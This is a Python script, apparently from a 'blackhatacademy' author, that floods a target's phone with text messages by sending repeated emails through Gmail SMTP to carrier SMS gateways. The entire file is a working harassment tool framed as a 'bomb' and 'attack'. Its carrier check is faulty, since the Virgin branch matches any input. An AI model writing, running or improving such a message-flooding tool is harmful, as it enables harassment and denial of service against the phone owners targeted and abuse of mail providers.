#!/usr/bin/python
## d1zzY
## www.kirkdurbin.com
## www.blackhatacademy.org

import smtplib
import sys

def get_email():
	print("")
	get_email = input("Enter your e-mail: ")
	
	if '@gmail.com' not in get_email:
		email = get_email+'@gmail.com'
	else:
		email = get_email

	return email

def launch_bomb():
	## Start mailserver junk
	mailserver = smtplib.SMTP('smtp.gmail.com')
	mailserver.ehlo()
	mailserver.starttls()
	mailserver.ehlo()

	## Get bomb info
	email = get_email()
	password = input("E-Mail password: ")
	phone_num = input("Number to bomb: ")
	carrier = input("Target's carrier: ")
	text = input("Text to send: ")
	num_texts = int(input("Number of bombs: "))

	print("")

	if carrier.lower() == 'att':
		target = phone_num + '@text.att.net'
	elif carrier.lower() == 'verizon':
		target = phone_num + '@vtext.com'
	elif carrier.lower() == 'tmobile':
		target = phone_num + '@tmomail.net'
	elif carrier.lower() == 'sprint':
		target = phone_num + '@messaging.sprintpcs.com'
	elif carrier.lower() == 'virgin' or 'virgin mobile' or 'virginmobile':
		target = phone_num + '@vmobl.com'
	else:
		print("Carrier not supported. Send an e-mail to add functionality")

	mailserver.login(email, password)

	x = input("Press enter to launch bomb.")
	print("")

	for t in range(0, num_texts):
		mailserver.sendmail(email, target, text)
		print("Bomb " + str(t+1) + " sent!")
		
	mailserver.close()
	print("")
	print("Attack successful!")
	print("")
	sys.exit()


## MAIN

def main():
	launch_bomb()

main()
